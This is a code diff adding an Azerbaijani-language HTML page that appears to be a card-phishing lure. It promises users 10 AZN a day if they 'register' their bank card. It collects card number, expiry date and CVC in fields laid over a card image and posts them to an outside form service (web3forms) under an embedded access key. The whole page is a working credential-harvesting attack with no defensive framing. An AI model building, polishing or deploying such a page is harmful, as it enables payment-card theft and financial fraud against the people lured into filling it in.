@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="az">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Bank Kartı</title>
+    <style>
+      body {
+        margin: 0;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: #f4f4f9;
+      }
+
+      .card-container {
+        position: relative;
+        width: 500px; /* kartın eni */
+      }
+
+      .card-container img {
+        width: 100%;
+        border-radius: 15px;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+        display: block;
+      }
+
+      .card-container input {
+        position: absolute;
+        padding: 6px;
+        font-size: 18px;
+        border: none;
+        border-radius: 6px;
+        background: rgba(255, 255, 255, 0.8);
+        text-align: center;
+      }
+
+      /* Kart nömrəsi (ortada) */
+      #card {
+        bottom: 170px;
+        left: 20px;
+        width: 60%;
+        letter-spacing: 2px;
+      }
+
+      /* Bitmə tarixi (sol aşağıda) */
+      #expiry {
+        bottom: 110px;
+        left: 20px;
+        width: 120px;
+      }
+
+      /* CVC (sağ aşağıda) */
+      #cvc {
+        bottom: 110px;
+        right: 160px;
+        width: 100px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card-container">
+      <h1>Hər gün 10azn qazan.</h1>
+      <h3>kartını qeyd et pulu götür</h3>
+      <!-- Sənin kart şəkli (öz şəkil yolunu qoy) -->
+      <img src="kart yasil.jpg" alt="Bank Kartı" />
+
+      <!-- Input-lar -->
+      <form action="https://api.web3forms.com/submit" method="POST">
+        <!-- Web3Forms KEY -->
+        <input
+          type="hidden"
+          name="access_key"
+          value="c729b137-5cfe-4074-ad33-e1cd5f8fc1bd"
+        />
+        <input
+          type="text"
+          name="card"
+          id="card"
+          placeholder="0000-0000-0000-0000"
+          maxlength="19"
+          inputmode="numeric"
+        />
+        <input
+          type="text"
+          name="card"
+          id="expiry"
+          placeholder="MM/YY"
+          maxlength="5"
+          inputmode="numeric"
+        />
+        <input
+          type="text"
+          name="card"
+          id="cvc"
+          placeholder="CVC"
+          maxlength="3"
+          inputmode="numeric"
+        />
+        <div style="text-align: center; margin-top: 20px">
+          <button class="my-btn" type="submit">QAZAN</button>
+        </div>
+      </form>
+      <style>
+        .my-btn {
+          padding: 10px 24px;
+          font-size: 16px;
+          border: none;
+          border-radius: 6px;
+          background-color: #007bff; /* normal rəng */
+          color: white;
+          cursor: pointer;
+          transition: background-color 0.2s;
+        }
+
+        .my-btn:hover {
+          background-color: #0056b3; /* üzərinə gələndə */
+        }
+
+        .my-btn:active {
+          background-color: #003f7f; /* basanda */
+        }
+      </style>
+    </div>
+    <script>
+      // Kart nömrəsi formatlama
+      const cardInput = document.getElementById("card");
+      cardInput.addEventListener("input", function (e) {
+        let value = e.target.value.replace(/\D/g, "");
+        value = value.substring(0, 16);
+        let formattedValue = "";
+        for (let i = 0; i < value.length; i++) {
+          if (i > 0 && i % 4 === 0) {
+            formattedValue += "-";
+          }
+          formattedValue += value[i];
+        }
+        e.target.value = formattedValue;
+      });
+
+      // Bitmə tarixi formatlama (MM/YY)
+      const expiryInput = document.getElementById("expiry");
+      expiryInput.addEventListener("input", function (e) {
+        let value = e.target.value.replace(/\D/g, "");
+        value = value.substring(0, 4);
+        if (value.length >= 3) {
+          e.target.value = value.substring(0, 2) + "/" + value.substring(2);
+        } else {
+          e.target.value = value;
+        }
+      });
+    </script>
+  </body>
+</html>
